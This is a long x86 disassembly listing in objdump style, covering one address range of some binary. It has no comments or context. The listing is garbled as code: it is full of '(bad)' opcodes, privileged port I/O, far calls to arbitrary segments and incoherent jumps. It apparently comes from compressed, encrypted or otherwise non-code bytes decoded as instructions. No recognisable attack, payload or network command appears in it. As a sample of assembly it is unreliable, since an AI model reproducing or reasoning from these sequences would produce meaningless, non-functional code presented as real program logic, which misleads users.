  412b21:	add    edx,DWORD PTR [edx+eax*2]
  412b24:	retf   
  412b25:	inc    ebx
  412b26:	sub    dh,0xce
  412b29:	out    0xcd,eax
  412b2b:	jb     0x412b7e
  412b2d:	out    0x4b,eax
  412b2f:	push   eax
  412b30:	fild   DWORD PTR [edx-0x50]
  412b33:	mov    cs:0x5bdb35df,eax
  412b39:	jns    0x412abc
  412b3b:	loopne 0x412ad6
  412b3d:	mov    bh,ah
  412b3f:	or     ebx,DWORD PTR [esi]
  412b41:	push   cs
  412b42:	jg     0x412ba5
  412b44:	jecxz  0x412b62
  412b46:	lods   eax,DWORD PTR ds:[esi]
  412b47:	repnz stos BYTE PTR es:[edi],al
  412b49:	pushf  
  412b4a:	and    eax,edx
  412b4c:	jg     0x412ae9
  412b4e:	stos   BYTE PTR es:[edi],al
  412b4f:	xor    ah,cl
  412b51:	jl     0x412b71
  412b53:	iret   
  412b54:	leave  
  412b55:	sahf   
  412b56:	cmp    cl,BYTE PTR [ebp+ebx*4-0x50]
  412b5a:	es nop
  412b5c:	sbb    DWORD PTR [ecx-0x52],esi
  412b5f:	pop    ebp
  412b60:	adc    ah,BYTE PTR [esi+0x16]
  412b63:	fsubp  st(3),st
  412b65:	je     0x412b24
  412b67:	mov    esp,0x54cf8fcd
  412b6c:	fsub   DWORD PTR [edx-0x29]
  412b6f:	(bad)  
  412b70:	push   es
  412b71:	sub    eax,0x5eb3dbf6
  412b76:	sbb    bl,BYTE PTR [esi-0x41]
  412b79:	addr16 in al,0x5e
  412b7c:	pop    ss
  412b7d:	sahf   
  412b7e:	in     eax,0x5f
  412b80:	arpl   cx,ax
  412b82:	mov    cl,0xb4
  412b84:	xor    DWORD PTR [ecx],0xffffffb7
  412b87:	fmul   QWORD PTR [edx-0x28b7b5b6]
  412b8d:	clc    
  412b8e:	adc    BYTE PTR [ecx+0x57],dh
  412b91:	gs stos DWORD PTR es:[edi],eax
  412b93:	xor    dh,BYTE PTR [ebp+0x7e720089]
  412b99:	jbe    0x412b8e
  412b9b:	fcomip st,st(2)
  412b9d:	cmp    esp,0xfffffff5
  412ba0:	xor    BYTE PTR [ecx+0x3e34be1c],dl
  412ba6:	shr    BYTE PTR [edi+0x17],cl
  412ba9:	jmp    0x412c1e
  412bab:	repnz mov eax,ds:0x4a0d5b27
  412bb1:	jbe    0x412b6f
  412bb3:	push   cs
  412bb4:	cli    
  412bb5:	mov    bl,BYTE PTR [ebp+0x61af2b2b]
  412bbb:	xchg   edx,eax
  412bbc:	jb     0x412b60
  412bbe:	(bad)  
  412bbf:	mov    al,ds:0x3a916bf0
  412bc4:	add    eax,0xab2e5a90
  412bc9:	imul   eax,DWORD PTR [edx],0xcfbcfb36
  412bcf:	inc    ebp
  412bd0:	cmp    cl,dh
  412bd2:	inc    esi
  412bd3:	add    ebp,DWORD PTR [ecx]
  412bd5:	out    dx,al
  412bd6:	mov    dl,BYTE PTR [eax+0x43]
  412bd9:	in     eax,dx
  412bda:	sub    al,0x51
  412bdc:	shl    BYTE PTR [ebp-0x639f4078],1
  412be2:	cmp    DWORD PTR ds:0x80c9cf12,esp
  412be8:	cmp    BYTE PTR [eax-0x6a4112ce],0x71
  412bef:	push   ebx
  412bf0:	sub    cl,cl
  412bf2:	test   eax,0x456ac012
  412bf7:	jns    0x412c12
  412bf9:	xchg   ecx,eax
  412bfa:	jg     0x412ba3
  412bfc:	mov    ds:0xaeba1de6,eax
  412c01:	xchg   ebp,eax
  412c02:	jb     0x412c76
  412c04:	and    edx,DWORD PTR [ebp-0x72]
  412c07:	(bad)  
  412c08:	repz inc ecx
  412c0a:	sub    ebp,edx
  412c0c:	leave  
  412c0d:	push   0x4ca4115a
  412c12:	push   edi
  412c13:	aad    0x8c
  412c15:	sti    
  412c16:	mov    ebp,0x87283f01
  412c1b:	cmp    dh,bl
  412c1d:	cs adc al,0x31
  412c20:	loope  0x412c86
  412c22:	ss push edx
  412c24:	fisubr WORD PTR [ebp-0x31]
  412c27:	dec    esp
  412c28:	aad    0xb
  412c2a:	in     al,0xcb
  412c2c:	xor    ah,dl
  412c2e:	jge    0x412c48
  412c30:	fs mov edi,esi
  412c33:	leave  
  412c34:	sub    al,0x1e
  412c36:	aad    0xf3
  412c38:	ret    
  412c39:	push   esp
  412c3a:	mov    ch,0xdf
  412c3c:	test   al,0x4
  412c3e:	sub    dh,BYTE PTR [ebp+0xf]
  412c41:	js     0x412c39
  412c43:	aam    0xc7
  412c45:	ffree  st(5)
  412c47:	cmp    al,0xc4
  412c49:	inc    sp
  412c4b:	lods   al,BYTE PTR ds:[esi]
  412c4c:	sub    BYTE PTR [eax+0x2b],0xa4
  412c50:	into   
  412c51:	mov    esp,0x72170f22
  412c56:	call   0x4ce0:0x547a88e1
  412c5d:	pop    ds
  412c5e:	push   ds
  412c5f:	adc    ebx,eax
  412c61:	cs adc ch,BYTE PTR fs:[ecx+0xb3d6ab0]
  412c69:	add    edx,ecx
  412c6b:	push   esi
  412c6c:	lea    ebp,[ecx+edx*4-0x6d]
  412c70:	ds jmp 0x18ea:0x6e56546d
  412c78:	and    al,0x33
  412c7a:	fisub  WORD PTR [eax-0x22]
  412c7d:	mov    bh,0xfd
  412c7f:	lahf   
  412c80:	push   ebx
  412c81:	xchg   edi,eax
  412c82:	jecxz  0x412c67
  412c84:	outs   dx,BYTE PTR ds:[esi]
  412c85:	inc    edi
  412c86:	add    eax,0xa2a19a24
  412c8b:	nop
  412c8c:	cs enter 0x4082,0xdf
  412c91:	mov    al,ds:0x3d1ef918
  412c96:	les    esi,FWORD PTR [ebx-0x4d]
  412c99:	jns    0x412c6b
  412c9b:	dec    edx
  412c9c:	fnstcw WORD PTR [edi]
  412c9e:	scas   al,BYTE PTR es:[edi]
  412c9f:	fs daa 
  412ca1:	not    BYTE PTR [ebx]
  412ca3:	xlat   BYTE PTR ds:[ebx]
  412ca4:	xor    DWORD PTR [esi+ebx*2+0x52282eef],0xd95e2b7e
  412caf:	pop    ds
  412cb0:	sub    BYTE PTR [eax+0x67a7481c],bl
  412cb6:	sub    dh,dh
  412cb8:	xchg   esi,eax
  412cb9:	retf   
  412cba:	stc    
  412cbb:	popa   
  412cbc:	mov    WORD PTR [ecx+0x2b],gs
  412cbf:	rol    DWORD PTR [ebx+0x56],1
  412cc2:	push   edx
  412cc3:	shl    DWORD PTR [eax-0x58],0x41
  412cc7:	test   BYTE PTR [eax-0x47],cl
  412cca:	inc    edx
  412ccb:	outs   dx,DWORD PTR ds:[esi]
  412ccc:	ss jno 0x412c51
  412ccf:	inc    edi
  412cd0:	js     0x412d10
  412cd2:	jmp    0x9f7c25dd
  412cd7:	lods   al,BYTE PTR ds:[esi]
  412cd8:	(bad)  
  412cd9:	pop    ds
  412cda:	push   cs
  412cdb:	adc    bh,dl
  412cdd:	or     bh,BYTE PTR [ebp-0x55]
  412ce0:	fwait
  412ce1:	in     al,dx
  412ce2:	adc    al,0x95
  412ce4:	jne    0x412c69
  412ce6:	or     al,0x24
  412ce8:	cdq    
  412ce9:	and    al,0xb0
  412ceb:	(bad)  
  412ced:	pop    esp
  412cee:	outs   dx,BYTE PTR ds:[esi]
  412cef:	push   0x17
  412cf1:	add    ah,BYTE PTR [eax-0x3ebfca1a]
  412cf7:	sar    BYTE PTR [eax+edi*8-0x3103bfe9],0xeb
  412cff:	test   DWORD PTR [eax],0xad7f422e
  412d05:	mov    bl,0x98
  412d07:	stc    
  412d08:	fyl2xp1 
  412d0a:	sbb    eax,0x56df3d3c
  412d0f:	dec    esp
  412d10:	sar    DWORD PTR [ebp-0x19],cl
  412d13:	mov    eax,0xeb3d1cd3
  412d18:	gs push 0x34
  412d1b:	mov    ds,WORD PTR [edx]
  412d1d:	jbe    0x412d34
  412d1f:	ss cmp esp,edx
  412d22:	popa   
  412d23:	sbb    dh,cl
  412d25:	push   edi
  412d26:	cmp    DWORD PTR [ecx],ecx
  412d28:	daa    
  412d29:	aaa    
  412d2a:	xor    BYTE PTR [esi-0x14],ah
  412d2d:	retf   0x2bc5
  412d30:	and    al,0xab
  412d32:	xor    al,0xc
  412d34:	or     eax,0x30db1ba
  412d39:	xor    eax,0x7203f653
  412d3e:	or     al,0xb4
  412d40:	out    dx,eax
  412d41:	pop    esp
  412d42:	iret   
  412d43:	jg     0x412dba
  412d45:	in     eax,dx
  412d46:	int3   
  412d47:	dec    ebx
  412d48:	loop   0x412ceb
  412d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4c:	cmp    ah,BYTE PTR [ebx-0x7b561f04]
  412d52:	add    BYTE PTR [ebp+0x63f781f2],al
  412d58:	sbb    eax,0x367412d6
  412d5d:	addr16 mov al,ds:0x353a
  412d61:	xchg   esp,eax
  412d62:	in     al,0xc
  412d64:	jne    0x412d01
  412d66:	or     DWORD PTR [ecx+0x1d],eax
  412d69:	jp     0x412d10
  412d6b:	fcom   QWORD PTR [esi]
  412d6d:	adc    BYTE PTR [esi+0x7224d817],0x47
  412d74:	stos   DWORD PTR es:[edi],eax
  412d75:	out    0x59,al
  412d77:	in     al,dx
  412d78:	dec    ecx
  412d79:	push   0x45
  412d7b:	add    eax,0xcdc4af19
  412d80:	repz leave 
  412d82:	es mov dl,bh
  412d85:	mov    ds:0x6f500cc2,eax
  412d8a:	mov    al,ds:0x85a49be9
  412d8f:	sub    DWORD PTR [ebx],edi
  412d91:	mov    edi,0xc49d30bc
  412d96:	mov    ecx,0xbe3e2114
  412d9b:	sahf   
  412d9c:	into   
  412d9d:	push   0x57
  412d9f:	xchg   esp,eax
  412da0:	add    DWORD PTR [edi],ebx
  412da2:	test   BYTE PTR [esi-0x51],ah
  412da5:	inc    edi
  412da6:	outs   dx,BYTE PTR ds:[esi]
  412da7:	mov    ecx,es
  412da9:	add    edi,DWORD PTR [eax+0x1a]
  412dac:	sar    dh,0x81
  412daf:	sbb    BYTE PTR [esi+0x368c9480],0x12
  412db6:	sbb    ebx,0x44aa5e99
  412dbc:	jnp    0x412df9
  412dbe:	inc    ebp
  412dbf:	xchg   BYTE PTR [esi],bl
  412dc1:	sbb    dl,BYTE PTR [esi]
  412dc3:	pop    ebx
  412dc4:	or     BYTE PTR [esp+eax*2],ah
  412dc7:	hlt    
  412dc8:	in     eax,0x68
  412dca:	or     DWORD PTR [ecx],ebp
  412dcc:	xchg   edi,eax
  412dcd:	and    eax,0x5998622d
  412dd2:	rcl    esp,1
  412dd4:	mov    dh,0xcd
  412dd6:	in     eax,0x36
  412dd8:	xchg   esp,eax
  412dd9:	(bad)  
  412dda:	aad    0x1
  412ddc:	sti    
  412ddd:	adc    ch,dl
  412ddf:	scas   al,BYTE PTR es:[edi]
  412de0:	pop    ss
  412de1:	call   0xefe5:0xfa6108d3
  412de8:	add    DWORD PTR cs:[edi],edi
  412deb:	into   
  412dec:	mov    bl,0x21
  412dee:	gs call 0x9416fb95
  412df4:	push   ecx
  412df5:	dec    eax
  412df6:	loopne 0x412dd4
  412df8:	aad    0x38
  412dfa:	jb     0x412e49
  412dfc:	pop    ebp
  412dfd:	rcl    DWORD PTR [esi-0x791fa],1
  412e03:	clc    
  412e04:	cmp    bl,dl
  412e06:	inc    edx
  412e07:	test   DWORD PTR [edx+eax*8],0xf2d8e131
  412e0e:	sbb    BYTE PTR [ebx],al
  412e10:	les    edi,FWORD PTR [esp+eax*1]
  412e13:	xchg   esp,eax
  412e14:	jmp    0x412e27
  412e16:	addps  xmm5,XMMWORD PTR [ebx+eiz*2-0x6e290084]
  412e1e:	cmp    eax,0x70d80f9e
  412e23:	xchg   esi,eax
  412e24:	ss pop ss
  412e26:	data16 mov bl,0xa2
  412e29:	push   ecx
  412e2a:	cwde   
  412e2b:	mov    DWORD PTR [esi+0x6a3dd03b],edi
  412e31:	mov    DWORD PTR [edx],eax
  412e33:	xchg   DWORD PTR [esi-0x387d09ee],ebp
  412e39:	jne    0x412e16
  412e3b:	call   0x937:0xb8eec76a
  412e42:	or     BYTE PTR [ebx],ch
  412e44:	add    dh,BYTE PTR [esi-0x47]
  412e47:	inc    edi
  412e48:	mov    al,0x65
  412e4a:	or     dh,0x3c
  412e4d:	sbb    ch,BYTE PTR [eax+0x1c]
  412e50:	pop    ss
  412e51:	dec    esp
  412e52:	outs   dx,DWORD PTR ds:[esi]
  412e53:	cmc    
  412e54:	ret    
  412e55:	cmp    BYTE PTR [ebp+0x2f7139a2],0x15
  412e5c:	ret    
  412e5d:	lea    eax,es:[ebp+0x6f]
  412e61:	pop    ss
  412e62:	retf   0x2bfc
  412e65:	xchg   DWORD PTR [ecx],esp
  412e67:	push   ss
  412e68:	rcl    BYTE PTR [esi-0x52b0e4a1],1
  412e6e:	adc    al,0x8a
  412e70:	leave  
  412e71:	jge    0x412e80
  412e73:	adc    DWORD PTR [eax],esp
  412e75:	mov    esp,0x77f1aa95
  412e7a:	jno    0x412ea6
  412e7c:	push   edx
  412e7d:	mov    al,0x67
  412e7f:	daa    
  412e80:	int3   
  412e81:	or     eax,0x794156f9
  412e86:	pop    esp
  412e87:	imul   ecx,DWORD PTR [esi],0xa59e2a14
  412e8d:	(bad)  
  412e8e:	cld    
  412e8f:	xchg   DWORD PTR [ecx+0x3f],ebp
  412e92:	call   0x5b4c:0xb57d8cdb
  412e99:	and    ebx,ecx
  412e9b:	js     0x412ef7
  412e9d:	pop    ecx
  412e9e:	rcr    ebp,cl
  412ea0:	jnp    0x412f19
  412ea2:	mov    ds:0x82bf5e74,al
  412ea7:	inc    esp
  412ea8:	js     0x412e9b
  412eaa:	jae    0x412ed7
  412eac:	fsub   st(0),st
  412eae:	cdq    
  412eaf:	push   ss
  412eb0:	les    eax,FWORD PTR [ecx-0x49adc1eb]
  412eb6:	mov    WORD PTR [esi+edx*2-0x9],es
  412eba:	xlat   BYTE PTR ds:[ebx]
  412ebb:	test   al,0xfd
  412ebd:	fmulp  st(5),st
  412ebf:	dec    edi
  412ec0:	mov    cl,0xec
  412ec2:	jae    0x412e60
  412ec4:	xor    DWORD PTR [edi+edx*4],0x3691cde1
  412ecb:	pop    ebx
  412ecc:	pop    ds
  412ecd:	cmp    esi,ecx
  412ecf:	outs   dx,BYTE PTR ds:[esi]
  412ed0:	mov    WORD PTR ds:0x1dcf1e72,fs
  412ed6:	js     0x412eb6
  412ed8:	ficom  DWORD PTR [ebp+0x5edf0487]
  412ede:	mov    edi,0x9bf0e8a3
  412ee3:	push   ss
  412ee4:	add    al,dl
  412ee6:	sbb    eax,0x168042d3
  412eeb:	xchg   edi,eax
  412eec:	fiadd  DWORD PTR [ecx-0x46a01c02]
  412ef2:	xchg   ebx,eax
  412ef3:	fadd   DWORD PTR [ebx+0x34ed9af8]
  412ef9:	test   al,0x57
  412efb:	mov    esp,0x75990d73
  412f00:	stc    
  412f01:	sub    ecx,DWORD PTR [edi]
  412f03:	jecxz  0x412ec6
  412f05:	xchg   esp,eax
  412f06:	std    
  412f07:	ins    DWORD PTR es:[edi],dx
  412f08:	in     eax,dx
  412f09:	cmp    DWORD PTR ds:0x718d90a,ebp
  412f0f:	mov    ds:0xff67f13f,al
  412f14:	push   ebp
  412f15:	bnd jo 0x412eef
  412f18:	dec    ecx
  412f19:	sub    ecx,DWORD PTR [esi-0x1f2b66f4]
  412f1f:	push   ebx
  412f20:	inc    eax
  412f21:	and    BYTE PTR [ebp+0x33],dh
  412f24:	retf   0x9fe9
  412f27:	out    dx,al
  412f28:	cmp    eax,0x74f6aaff
  412f2d:	dec    ebp
  412f2e:	lock popf 
  412f30:	pop    esp
  412f31:	xchg   ecx,eax
  412f32:	xchg   ecx,eax
  412f33:	nop
  412f34:	xchg   ecx,eax
  412f35:	out    0x1d,eax
  412f37:	xchg   esp,eax
  412f38:	xchg   ecx,eax
  412f39:	push   eax
  412f3a:	push   ecx
  412f3b:	xchg   esp,eax
  412f3c:	push   0x7f
  412f3e:	(bad)  
  412f3f:	in     al,dx
  412f40:	jp     0x412ef7
  412f42:	jge    0x412f00
  412f44:	loop   0x412fb2
  412f46:	clc    
  412f47:	in     al,dx
  412f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f49:	pop    es
  412f4a:	dec    ecx
  412f4b:	dec    esp
  412f4c:	or     cl,ah
  412f4e:	push   esi
  412f4f:	mov    WORD PTR [ebx+0x40],fs
  412f52:	aaa    
  412f53:	xchg   ecx,eax
  412f54:	ret    
  412f55:	pop    esi
  412f56:	test   eax,0x65d5d2ed
  412f5b:	push   0xffffffaf
  412f5d:	loopne 0x412f1c
  412f5f:	add    al,0xbb
  412f61:	adc    eax,0x695b9cfe
  412f66:	fdiv   DWORD PTR [ecx+ebp*4]
  412f69:	inc    ebx
  412f6a:	mov    eax,ds:0x1a5b4562
  412f6f:	loope  0x412f14
  412f71:	rcl    BYTE PTR [eax+0x773e7270],0xfc
  412f78:	rol    DWORD PTR [ebx+0x5c],cl
  412f7b:	jns    0x412fd1
  412f7d:	pop    ds
  412f7e:	sbb    BYTE PTR ds:0xfb257c43,ch
  412f84:	fldcw  WORD PTR [ebp*4-0x254e39d2]
  412f8b:	push   esp
  412f8c:	mov    fs:0x8553fe70,eax
  412f92:	data16 out dx,al
  412f94:	inc    ebx
  412f95:	ret    0x7fe5
  412f98:	pop    esi
  412f99:	adc    esp,ebp
  412f9b:	loope  0x412f23
  412f9d:	mov    edi,0x40f8db02
  412fa2:	jmp    FWORD PTR [esi+0x4e412266]
  412fa8:	pop    ebx
  412fa9:	fdiv   QWORD PTR [ecx]
  412fab:	inc    ebx
  412fac:	pop    ebp
  412fad:	xchg   ecx,eax
  412fae:	(bad)  
  412faf:	push   edx
  412fb0:	out    dx,al
  412fb1:	inc    esp
  412fb2:	out    dx,eax
  412fb3:	nop
  412fb4:	fwait
  412fb5:	push   es
  412fb6:	pop    ss
  412fb7:	push   ss
  412fb8:	cld    
  412fb9:	inc    esi
  412fba:	sbb    ebx,DWORD PTR gs:[ebp+0x15]
  412fbe:	mov    BYTE PTR [ecx+0x19082710],bh
  412fc4:	jb     0x413037
  412fc6:	push   ss
  412fc7:	fnstsw WORD PTR [esi+0x3e69aa02]
  412fcd:	push   esp
  412fce:	push   ecx
  412fcf:	ret    0x62c5
  412fd2:	and    al,0x54
  412fd4:	(bad)  
  412fd5:	cwde   
  412fd6:	adc    DWORD PTR [ebx+0x202d5e06],0x13
  412fdd:	push   edi
  412fde:	out    0xec,eax
  412fe0:	adc    eax,0x13edd2b4
  412fe5:	call   0x4040:0x8cc02a21
  412fec:	fwait
  412fed:	or     BYTE PTR [eax+0x3a4514f],dh
  412ff3:	mov    eax,ds:0x27f95343
  412ff8:	pusha  
  412ff9:	nop
  412ffa:	mov    ch,0xa2
  412ffc:	or     BYTE PTR [edi],0x9d
  412fff:	mov    eax,0x4ad1251c
  413004:	sbb    eax,0x2ea87c4f
  413009:	mov    al,0x71
  41300b:	cli    
  41300c:	outs   dx,DWORD PTR ds:[esi]
  41300d:	(bad)  
  41300e:	dec    BYTE PTR [eax-0x100348a5]
  413014:	mov    al,ds:0x4a93c72c
  413019:	mov    ds:0x1015d7f,al
  41301e:	pop    ss
  41301f:	je     0x413033
  413021:	mov    ebx,0x44394be5
  413026:	or     DWORD PTR [ebp+esi*2+0x6],ecx
  41302a:	ss shl DWORD PTR cs:[esi+ebp*8-0x5d],1
  413030:	outs   dx,DWORD PTR ds:[esi]
  413031:	loope  0x412fe3
  413033:	mov    edi,0x9d1f6f2f
  413038:	add    eax,0x4dc9a7f6
  41303d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41303e:	or     DWORD PTR ds:0x1006d9b9,edi
  413044:	shl    BYTE PTR [eax],cl
  413046:	or     al,0x24
  413048:	(bad)  
  413049:	sub    al,0xe3
  41304b:	xchg   esp,eax
  41304c:	pop    edi
  41304d:	mov    bh,0x47
  41304f:	mov    dl,0xd9
  413051:	sub    dh,BYTE PTR [ebp-0x6f139dcf]
  413057:	and    DWORD PTR [edi],ebp
  413059:	pop    eax
  41305a:	and    al,0xba
  41305c:	pop    eax
  41305d:	fdiv   QWORD PTR [ecx+ebp*8]
  413060:	fmul   st,st(1)
  413062:	sub    al,0x10
  413064:	addr16 test al,0x6f
  413067:	retf   0x90e3
  41306a:	aam    0xeb
  41306c:	out    0xcc,eax
  41306e:	nop
  41306f:	push   ecx
  413070:	call   0xbbe9:0x4bee843a
  413077:	inc    edx
  413078:	mov    ebx,edx
  41307a:	pop    ss
  41307b:	jae    0x4130c2
  41307d:	inc    esp
  41307e:	add    al,0xb6
  413080:	inc    edx
  413081:	(bad)  [edx]
  413083:	mov    eax,ds:0x8d7f4ab4
  413088:	sbb    al,0xea
  41308a:	pop    esp
  41308b:	popf   
  41308c:	sub    BYTE PTR [eax+0x1a],bl
  41308f:	xlat   BYTE PTR ds:[ebx]
  413090:	sbb    al,0x8e
  413092:	loopne 0x4130fd
  413094:	test   DWORD PTR [ebx+0x6a],ecx
  413097:	xor    al,0x6c
  413099:	add    edi,DWORD PTR [esi+esi*1-0x6984309e]
  4130a0:	(bad)  
  4130a1:	popa   
  4130a2:	or     DWORD PTR [edi-0x571cf407],ebp
  4130a8:	xor    esi,edx
  4130aa:	inc    edi
  4130ab:	es gs mov ch,0x8a
  4130af:	(bad)  
  4130b0:	xchg   esp,eax
  4130b1:	mov    bl,0xc
  4130b3:	adc    BYTE PTR [eax+0x47],ch
  4130b6:	loope  0x4130a6
  4130b8:	push   cs
  4130b9:	xor    esp,eax
  4130bb:	aad    0x59
  4130bd:	mov    ds:0xe435beef,al
  4130c2:	mov    bh,BYTE PTR [ecx]
  4130c4:	or     DWORD PTR [ecx-0x2a7e539d],0x2a
  4130cb:	and    DWORD PTR [eax-0x24],edi
  4130ce:	ja     0x413086
  4130d0:	das    
  4130d1:	neg    ebp
  4130d3:	mov    eax,0xbb9d6ff2
  4130d8:	cmp    al,BYTE PTR [esi]
  4130da:	and    dl,BYTE PTR [ebx-0x5a951a6]
  4130e0:	imul   esp,DWORD PTR es:[ecx+0x7cafd006],0x39
  4130e8:	jge    0x4130a9
  4130ea:	inc    esi
  4130eb:	mov    ebp,fs
  4130ed:	std    
  4130ee:	push   esp
  4130ef:	adc    eax,0x7d77206b
  4130f4:	sbb    al,0xac
  4130f6:	adc    al,0xa8
  4130f8:	mov    eax,0xec5815e5
  4130fd:	push   ebx
  4130fe:	cmp    BYTE PTR [eax+0x1e],al
  413101:	clc    
  413102:	repz and DWORD PTR [ebx],edi
  413105:	pop    ds
  413106:	rol    BYTE PTR [ecx+0x45],cl
  413109:	test   al,0xca
  41310b:	shl    DWORD PTR [edx+0x6d],0xfb
  41310f:	add    edi,DWORD PTR [esi+0x3]
  413112:	fmul   QWORD PTR [ecx+ecx*4]
  413115:	mov    esi,DWORD PTR [eax]
  413117:	pushf  
  413118:	mov    al,0x4b
  41311a:	jle    0xf21bb579
  413120:	and    cl,BYTE PTR [edx]
  413122:	jge    0x413160
  413124:	test   DWORD PTR [eax-0x45],esi
  413127:	lock or BYTE PTR [edx+0x15],bl
  41312b:	xchg   DWORD PTR [edx*2-0x72bde121],edi
  413132:	imul   ecx,eax,0xca9caa6b
  413138:	pop    esi
  413139:	xchg   ebx,eax
  41313a:	repnz mov ebx,0x514e5396
  413140:	sbb    al,0xa4
  413142:	sbb    ebx,0x9868d9af
  413148:	lods   al,BYTE PTR ds:[esi]
  413149:	and    BYTE PTR [eax-0x2f],dh
  41314c:	aam    0x5e
  41314e:	dec    ecx
  41314f:	pop    edi
  413150:	fld    TBYTE PTR [esi+0x20]
  413153:	xchg   edx,eax
  413154:	jmp    0x244f91d2
  413159:	and    DWORD PTR [edi-0xf],ebx
  41315c:	fist   DWORD PTR [ebp+0x3d]
  41315f:	enter  0x48d2,0xfc
  413163:	or     BYTE PTR [eax-0xa],bl
  413166:	xchg   esi,eax
  413167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413168:	mov    dh,0xf6
  41316a:	(bad)  
  41316b:	and    BYTE PTR [edx],bh
  41316d:	fdivr  QWORD PTR [edx-0x31]
  413170:	mov    WORD PTR [ebp-0x32e0441a],ds
  413176:	mov    fs,WORD PTR [ebx-0x12]
  413179:	fcmovb st,st(1)
  41317b:	ins    DWORD PTR es:[edi],dx
  41317c:	aaa    
  41317d:	call   0x4e535bed
  413182:	cwde   
  413183:	mov    ebp,0xfec8b60a
  413188:	ss xchg ebx,eax
  41318a:	(bad)  
  41318c:	jg     0x41312c
  41318e:	fs or  al,0x85
  413191:	xor    DWORD PTR [ebx-0x2f],edi
  413194:	ror    al,0xe6
  413197:	fnstsw WORD PTR [edi]
  413199:	inc    edx
  41319a:	push   ecx
  41319b:	ds mov bl,0x26
  41319e:	dec    edx
  41319f:	dec    esp
  4131a0:	jle    0x4131e9
  4131a2:	(bad)  
  4131a3:	mov    esi,0x583ec4e6
  4131a8:	lds    ebx,FWORD PTR [ebx]
  4131aa:	cmp    al,0x21
  4131ac:	adc    eax,0x91d7f85
  4131b1:	cmc    
  4131b2:	ja     0x413134
  4131b4:	push   ecx
  4131b5:	sub    dh,bh
  4131b7:	popf   
  4131b8:	inc    eax
  4131b9:	sbb    DWORD PTR [ebx],edi
  4131bb:	xchg   edi,eax
  4131bc:	leave  
  4131bd:	ja     0x41322a
  4131bf:	mov    esp,0x8229b19
  4131c4:	outs   dx,BYTE PTR ds:[esi]
  4131c5:	aam    0xb2
  4131c7:	or     dl,BYTE PTR [ecx+eiz*1+0xf412e8]
  4131ce:	pop    es
  4131cf:	nop
  4131d0:	scas   eax,DWORD PTR es:[edi]
  4131d1:	and    DWORD PTR [edx-0x577bb0a8],ecx
  4131d7:	inc    ebx
  4131d8:	ds enter 0xc0e8,0x46
  4131dd:	adc    eax,0xd63a2208
  4131e2:	lock (bad) 
  4131e4:	int3   
  4131e5:	pop    es
  4131e6:	xchg   ebx,eax
  4131e7:	or     al,0xba
  4131e9:	es hlt 
  4131eb:	inc    ebx
  4131ec:	sbb    DWORD PTR [edx+0x66],ebp
  4131ef:	push   0xffffffed
  4131f1:	xchg   DWORD PTR [ecx+0x1cb0f34b],edi
  4131f7:	popa   
  4131f8:	jmp    0xeec:0xd2329f9
  4131ff:	leave  
  413200:	inc    esi
  413201:	xchg   BYTE PTR [edx],cl
  413203:	pop    ebp
  413204:	das    
  413205:	inc    esp
  413206:	xchg   ecx,eax
  413207:	imul   ebp,DWORD PTR [esi-0x96c1eb2],0x76126496
  413211:	adc    al,dl
  413213:	mov    esi,0x43d1663a
  413218:	or     BYTE PTR [ebx],bh
  41321a:	jmp    0x41323d
  41321c:	mov    bl,0xf9
  41321e:	cmp    edx,edi
  413220:	xor    eax,0x69783de3
  413225:	call   0xe5f:0xa2468530
  41322c:	xor    dh,BYTE PTR [eax+ecx*8-0x9]
  413230:	popf   
  413231:	dec    edi
  413232:	outs   dx,DWORD PTR ds:[esi]
  413233:	dec    esp
  413234:	shr    DWORD PTR [ebp+0x62e776c1],1
  41323a:	fst    DWORD PTR [eax-0x21]
  41323d:	test   DWORD PTR [edx+0x102118b1],ecx
  413243:	jae    0x413284
  413245:	add    dh,bl
  413247:	lods   al,BYTE PTR ds:[esi]
  413248:	and    esp,DWORD PTR [edx]
  41324a:	dec    esp
  41324b:	ds jne 0x4131e9
  41324e:	mov    cs,WORD PTR [ebx+0x67]
  413251:	adc    al,0xbb
  413253:	mov    dl,0x10
  413255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413256:	ror    al,1
  413258:	mov    ch,0xe3
  41325a:	mov    edx,0x7615eafd
  41325f:	xor    BYTE PTR [ebp+ebp*4+0x36],0x4e
  413264:	fstp   QWORD PTR [ebx]
  413266:	fistp  QWORD PTR [esi-0x19]
  413269:	stos   BYTE PTR es:[edi],al
  41326a:	push   ss
  41326b:	and    ebx,eax
  41326d:	(bad)  
  41326e:	or     DWORD PTR [ecx-0x5b1474ff],eax
  413274:	add    edx,DWORD PTR [ecx+0x5d]
  413277:	mov    ebp,0x6452d1ae
  41327c:	fldcw  WORD PTR [esi]
  41327e:	outs   dx,BYTE PTR ds:[esi]
  41327f:	push   0xffffffa7
  413281:	push   esi
  413282:	aas    
  413283:	jecxz  0x413299
  413285:	xchg   ebp,eax
  413286:	neg    BYTE PTR [ebx]
  413288:	adc    eax,0x115685d7
  41328d:	fisttp DWORD PTR [esi-0x40b7fe4d]
  413293:	mov    dh,dh
  413295:	fnstcw WORD PTR [ecx]
  413297:	push   ebx
  413298:	fnstenv [edi+eax*8]
  41329b:	test   al,0xe8
  41329d:	pusha  
  41329e:	mov    bl,0xac
  4132a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a1:	icebp  
  4132a2:	jmp    0xcb31e629
  4132a7:	sar    DWORD PTR [ecx-0x1657d7b3],1
  4132ad:	add    DWORD PTR [ebx+edx*4],edi
  4132b0:	daa    
  4132b1:	push   es
  4132b2:	(bad)  
  4132b3:	push   ds
  4132b4:	int3   
  4132b5:	fimul  DWORD PTR [esi]
  4132b7:	rol    BYTE PTR [ecx-0x34ac6ba],1
  4132bd:	(bad)  
  4132be:	adc    esi,DWORD PTR [edx+0x37]
  4132c1:	nop
  4132c2:	add    al,0x58
  4132c4:	add    al,0x11
  4132c6:	and    al,0x45
  4132c8:	push   eax
  4132c9:	repnz mov eax,ds:0x8d09a7c7
  4132cf:	cmp    al,cl
  4132d1:	pop    ebx
  4132d2:	mov    cl,BYTE PTR [edx]
  4132d4:	nop
  4132d5:	push   esi
  4132d6:	rcr    BYTE PTR [esi+0x3d],1
  4132d9:	jb     0x4132fb
  4132db:	(bad)  
  4132dc:	imul   edx,DWORD PTR [ecx+0x3e],0xb2d3d36f
  4132e3:	in     al,0x6
  4132e5:	adc    bh,BYTE PTR [eax]
